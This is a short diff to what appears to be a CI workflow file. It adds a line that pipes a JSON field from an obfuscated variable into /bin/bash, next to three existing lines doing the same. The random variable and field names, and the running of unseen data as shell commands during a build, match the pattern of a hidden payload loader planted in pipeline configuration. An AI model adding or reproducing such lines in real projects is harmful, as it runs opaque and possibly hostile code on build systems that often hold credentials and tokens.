@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$zquom37360" | jq -r .k03 | /bin/bash
           echo $su07 | jq -r .csw211 | /bin/bash
           printf '%s' "$wkdvw2223" | jq -r .kikub520 | /bin/bash
+          echo $fxg54021 | jq -r .ksc8782 | /bin/bash
 
       - name: Store results
         if: always()
